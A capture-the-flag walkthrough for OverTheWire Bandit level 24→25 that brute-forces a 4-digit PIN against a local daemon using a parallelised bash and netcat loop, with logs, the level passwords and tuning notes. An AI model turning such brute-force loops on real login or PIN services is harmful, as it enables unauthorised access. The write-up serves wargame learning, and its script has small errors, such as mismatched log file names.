Bandit Level 24 → Level 25
==========================

Level Goal
----------

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.


Solution
========

According to the text we have to connect to localhost's port 30002 again and send the current level's password together with an unknown 4-digit pin code separated with a single space.
Sounds not that hard after we already learned how to use netcat and stuff in previous levels. The only thing I didn't know at the first attempt was how to create a string which represents a 4 digit number ranging from 0000 to 9999.
So I asked Google and found [an article on Stackoverflow](https://stackoverflow.com/questions/5099119/adding-a-zero-to-single-digit-variable) which helped me to write a small shell script which in turn generates the 4-digit pin code and sends it together with the current level's password to localhost port 30002. The first ```echo``` is just to display the current value of the pin code in order to get a feeling of how long the script might run:

```
bandit24@bandit:~$ cat script.sh
#!/bin/bash

for i in 000{1..9} 00{10..99} 0{100..999} {1000..9999} ; do
  echo "----> $i <----"
  echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" | nc localhost 30002
done
```

After waiting about 2 hours for the script to brute force the combination of the current level's password and the unknown pin code separated by a space, I wondered if my implementation was optimal... Each netcat connection to port 30002 took relatively long with a reasonable delay before the connection ended and the next connection has been created. Therefore after about 2 hours my script has only tested about the half of possible pin codes:

```
bandit24@bandit:~$ time ./script.sh
[...]
----> 4772 <----
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
Exiting.
----> 4773 <----
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
Exiting.
----> 4774 <----
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
Exiting.
----> 4775 <----
^C

real	121m30.664s
user	0m0.412s
sys	0m1.984s
```

Since I'm not aware of any threading mechanism in BASH, I simply put a & at the end of the command line in order to send the process to the background instead of waiting for it to end. This leads to some kind of "threaded"/"parallel" execution. Furthermore I recognized that a very huge amount of output text has been written to stdout. Therefore I was neither able to scroll back to the very beginning when I started the script nor was I sure if I possibly missed the correct password/pin combination in the meantime. So I added a redirect to the command line as well in order to log netcat's output:

```
bandit24@bandit:~$ cat script.sh
#!/bin/bash

for i in 000{1..9} 00{10..99} 0{100..999} {1000..9999} ; do
  echo "----> $i <----"
  echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" | nc localhost 30002 &>> log &
done
```

The modified script just took about 7 minutes in order to test all possible 10000 combinations. WHAT AN IMPROVEMENT! 

```
bandit24@bandit:~$ time ./script.sh
[...]
----> 9995 <----
----> 9996 <----
----> 9997 <----
----> 9998 <----
----> 9999 <----

real    7m23.807s
user    0m0.876s
sys     0m3.760s
```

Since we now are confident that each and every combination has been tested and logged, we can look for the correct combination which gives us the password for the next level. Due to the fact that most of the output of netcat looked identical we try to filter it out and hope to get the password for the next level extracted:

```
$ sort result | uniq -u
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
```

Please notice
=============

When I re-ran the previous steps in order to write this document, I realized that it didn't work any longer. I assume that it's caused by the various forks I did with the ```&``` at the end of the command because I got dozens of the following error messages while the script was running:

```
bandit24@bandit:~$ ./script.sh > log
./script.sh: fork: retry: Resource temporarily unavailable
./script.sh: fork: retry: Resource temporarily unavailable
./script.sh: fork: retry: Resource temporarily unavailable
./script.sh: fork: retry: Resource temporarily unavailable
./script.sh: fork: retry: Resource temporarily unavailable
./script.sh: fork: retry: Resource temporarily unavailable
[...]
```

I solved this by adding a ```sleep 1``` in order to make sure that not too many processes are spawned at the same time.
This still speeds up the execution of the script but prevents the errors. So the final solution I recommend to use is the following script:

```
bandit24@bandit:~$ cat script.sh
#!/bin/bash

for i in 000{1..9} 00{10..99} 0{100..999} {1000..9999} ; do
  echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" | nc localhost 30002 &
  sleep 1
done
```

It gets executed by redirecting the output to a log file then:

```
time ./script.sh > log
```
After about 90 minutes you'll get the correct combination of "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 5588" and the next level's password. Without sending the netcat sessions to the background using the ```&``` and ```sleep1``` the same script runs for about 140 minutes in order to get the same result! So it's still a big improvement.
Now let's double check if the found pin code is correct:

```
bandit24@bandit:~$   echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 5588" | nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
```


Tip
---

If you want to see what the script does while it runs and want to see the progress, you might want to start a ```tmux``` session first and open three tmux panes. Then in the upper pane you start the script. In the middle pane you watch the log for wrong tries in order to count them:
```
watch -n1 'grep "Wrong" log | wc -l'
```
And in the lower tmux pane you watch the log for successful tries in order to inform about the fact that we have found the correct password/pin combination and can stop the script:
```
watch -n1 'grep "Wrong" log | wc -l'
```

The resulting tmux session would then look similar to this on:

```
bandit24@bandit:~$ time ./script.sh > log



──────────────────────────────────────────────────────────────────────────────────────────────────────────
Every 1.0s: grep "Wrong" log | wc -l                                              Sat Oct 28 08:02:07 2017

699

──────────────────────────────────────────────────────────────────────────────────────────────────────────
Every 1.0s: grep "Correct" log | wc -l                                            Sat Oct 28 08:02:07 2017

0

```

Alternatives to create a 4-digit pin code
-----------------------------------------

```
seq -f "%0004g" 0 9999
```
```
python -c 'print "%(num)04d" % {"num":99}'
```
